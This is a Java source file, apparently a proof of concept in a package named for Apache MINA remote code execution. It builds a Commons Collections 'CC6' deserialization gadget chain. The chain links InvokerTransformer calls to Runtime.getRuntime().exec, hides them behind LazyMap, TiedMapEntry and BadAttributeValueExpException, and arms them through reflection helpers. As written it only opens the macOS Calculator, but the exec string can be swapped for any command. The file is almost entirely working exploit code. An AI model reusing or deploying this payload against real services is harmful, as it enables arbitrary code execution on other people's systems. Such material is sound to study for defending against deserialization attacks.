package org.apache.mina.example.rce;

import com.nqzero.permit.Permit;

import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

public class Reflections {
    public static Object getCC6() throws IllegalAccessException, NoSuchFieldException {
        String[] execArgs = new String[] {"open /System/Applications/Calculator.app"};
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, 
                    new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", 
                    new Class[] {Object.class, Object[].class }, 
                    new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) 
            };
        Map innerMap = new HashMap<>();
        Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
        
        return val;
    }

    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
        
        if (javaVersion < 12) {
            // quiet runtime warnings from JDK9+
            Permit.setAccessible(member);
        } else {
            // not possible to quiet runtime warnings anymore...
            // see https://bugs.openjdk.java.net/browse/JDK-8210522
            // to understand impact on Permit (i.e. it does not work
            // anymore with Java >= 12)
            member.setAccessible(true);
        } 
    }
    
    public static void setFieldValue(Object obj, String field, Object value){
        try {
            Class clazz = obj.getClass();
            Field fld = getField(clazz,field);
            fld.setAccessible(true);
            fld.set(obj, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            
            if ( field != null ) {
                field.setAccessible(true);
            } else if ( clazz.getSuperclass() != null ) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
            
            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
        
            throw e; 
        }
    } 
}